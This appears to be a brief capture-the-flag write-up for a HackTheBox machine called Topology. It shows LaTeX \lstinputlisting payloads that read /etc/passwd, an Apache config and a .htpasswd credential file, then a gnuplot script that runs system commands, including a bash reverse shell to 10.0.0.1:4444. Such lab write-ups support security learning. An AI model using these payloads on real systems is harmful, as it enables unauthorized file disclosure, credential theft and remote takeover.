# Topology - LaTeX .htpasswd / gnuplot .plt

**Bypass filter and read local file.**

```bash
$\lstinputlisting{/etc/passwd}$
$\lstinputlisting{/etc/apache2/sites-available/000-default.conf}$
```

**dev.topology.htb** is required HTTP basic auth

[image]

**We can see .htpasswd from** `/var/www/dev/.htpasswd`

```bash
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

[image]

## Privilege Escalation

The script file of `gnuplot` can be used to execute system commands as below.

```bash
gnuplot test.plt
```

Contents of the `.plt` is like the following.

```bash
system "whoami"

# Reverse shell
system "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
```

[image]
